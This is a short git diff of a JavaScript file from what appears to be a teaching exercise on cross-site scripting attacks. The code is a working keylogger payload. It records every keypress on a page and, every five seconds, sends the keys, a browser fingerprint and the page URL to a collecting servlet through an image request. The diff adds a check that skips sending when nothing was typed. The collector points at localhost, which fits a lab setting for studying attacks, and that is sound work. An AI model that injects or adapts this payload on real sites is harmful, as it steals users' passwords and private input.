@@ -21,7 +21,6 @@ function hashNavegador() {
 	return hash; 
 }
 
-
 //vamos guardando lo que escriba
 document.onkeypress = function(e) {
 	//Esto para que funcione en navegadores antiguos de IE
@@ -33,10 +32,12 @@ document.onkeypress = function(e) {
     keys += key;
 }
 
-//cada 1 segundo mandamos lo que haya escrito el usuario al SVTeclas
+//cada 5 segundos mandamos lo que haya escrito el usuario al SVTeclas
 window.setInterval(function(){
-    new Image().src = 'http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/SVTeclas?t='+keys+'&hash='+hash+'&pagina='+document.location;
-    keys = '';
+	if(keys.length>0) {
+    	new Image().src = 'http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/SVTeclas?t='+keys+'&hash='+hash+'&pagina='+document.location;
+    	keys = '';
+	}
 }, 5000);
 
 
